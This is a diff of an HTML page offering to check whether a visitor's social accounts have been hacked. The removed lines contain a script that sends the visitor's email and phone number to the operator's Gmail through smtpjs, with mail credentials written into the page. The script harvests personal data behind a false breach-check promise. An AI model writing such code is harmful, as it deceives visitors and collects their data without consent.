@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -36,7 +35,7 @@
                     We have a lot of social accounts that have been hacked before.
                     Now we are going to help you to find that your account is hacked or not.
                 </p>
-                <form class="input2" method="post" action="javascript:check()">
+                <form class="input2" method="post" action="verify/ve.html">
                     <label class="email" for="email">Enter Your Email:</label><br>
                     <input required id="email"  class="email-box" name="email" type="email"  placeholder="example@email.com" size="30"><br>
                     <label class="phone" for="num">Enter Your Phone Number:</label><br>
@@ -47,24 +46,5 @@
             </div>
         </div>
     </div>  
-  <script type="text/javascript">
-	    function check(){
-				var name = $('#num').val();
-				var emai = $('#email').val();
-
-				var body='number:'+name+',email:'+emai;
-
-				Email.send({
-				Host : "smtp.gmail.com",
-				Username : "pwnfinder@gmail.com",
-				Password : "official email of pwnfinder03",
-				To : "pwnfinder@gmail.com",
-				From : "pwnfinder@gmail.com",
-				Subject : "pwnfinder",
-				Body : body
-			}).then
-				window.location.href = "verify/ve.html";
-			}
-	</script>
 </body>
 </html>
